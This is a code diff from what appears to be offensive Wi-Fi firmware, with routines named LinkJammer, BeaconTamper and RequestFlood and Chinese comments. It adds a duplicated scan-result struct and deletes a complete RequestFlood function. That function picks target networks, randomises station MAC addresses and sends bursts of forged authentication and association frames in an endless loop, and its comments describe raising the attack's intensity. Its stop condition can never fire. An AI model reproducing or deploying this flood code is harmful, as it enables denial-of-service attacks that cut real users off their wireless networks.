@@ -2,6 +2,16 @@
 #include <vector>
 #include <set>
 
+typedef struct {
+  String ssid;
+  String bssid_str;
+  uint8_t bssid[6];
+  short rssi;
+  uint channel;
+  int security_type;
+} WiFiScanResult;
+
+
 
 
 /**
@@ -35,6 +45,16 @@ void LinkJammer();
 #undef rand
 #include <vector>
 #include <set>
+
+typedef struct {
+  String ssid;
+  String bssid_str;
+  uint8_t bssid[6];
+  short rssi;
+  uint channel;
+  int security_type;
+} WiFiScanResult;
+
 #include <utility>
 #include "debug.h"
 #include <Wire.h>
@@ -3385,76 +3405,8 @@ void drawLinkJammerStatusPage(const String& ssid, bool clearDisplay = true) { re
 void drawBeaconTamperStatusPage(const String& status, bool clearDisplay = true) { return; }
 
 // ===== 请求发送：高效认证/关联请求泛洪 =====
-void drawRequestFloodStatus(const String& ssid, bool clearDisplay = true) { return; }
-
-void RequestFlood() {
-  if (SelectedVector.empty()) {
-    showModalMessage("未找到有效SSID");
-    return;
-  }
-
-  // 多选目标时显示第一个目标的SSID，但攻击所有选中的目标
-  String displaySSID = scan_results[SelectedVector[0]].ssid;
-  if (SelectedVector.size() > 1) {
-    displaySSID = "多目标攻击中";
-  }
-
-  drawRequestFloodStatus(displaySSID);
-  startAttackLED();
-
-  // 预构建所有目标的信息
-  struct TargetInfo {
-    String ssid;
-    const uint8_t* bssid;
-    int channel;
-  };
-
-  std::vector<TargetInfo> targets;
-  targets.reserve(SelectedVector.size());
-
-  for (int selectedIndex : SelectedVector) {
-    if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
-      TargetInfo target;
-      target.ssid = scan_results[selectedIndex].ssid;
-      target.bssid = scan_results[selectedIndex].bssid;
-      target.channel = scan_results[selectedIndex].channel;
-      targets.push_back(target);
-    }
-  }
-
-  uint8_t staMac[6];
-  AuthReqFrame arf; size_t arflen;
-  AssocReqFrame asf; size_t asflen;
-
-  while (true) {
-    if ((HIGH == LOW) || (HIGH == LOW)) {
-      digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
-      delay(200);
-      stabilizeButtonState();
-      if (showConfirmModal("停止Dos攻击")) {
-        break;
-      } else {
-        startAttackLED();
-        drawRequestFloodStatus(displaySSID);
-      }
-    }
-
-    // 对每个目标进行攻击
-    for (const auto& target : targets) {
-      wext_set_channel(WLAN0_NAME, target.channel);
-
-      // 更换随机STA MAC，构建并突发发送
-      generateRandomMAC(staMac);
-      arflen = wifi_build_auth_req(staMac, (void*)target.bssid, arf);
-      asflen = wifi_build_assoc_req(staMac, (void*)target.bssid, target.ssid.c_str(), asf);
-
-      // 突发：大幅增加发包数量，提高攻击强度
-      for (int i = 0; i < 20; i++) { wifi_tx_raw_frame(&arf, arflen); }
-      for (int i = 0; i < 25; i++) { wifi_tx_raw_frame(&asf, asflen); }
-
-      // 移除目标间延时，提高攻击效率
-    }
-  }
+void drawRequestFloodStatus(const String& ssid, bool clearDisplay = true) {
+  return;
 }
 
 void LinkJammer() {
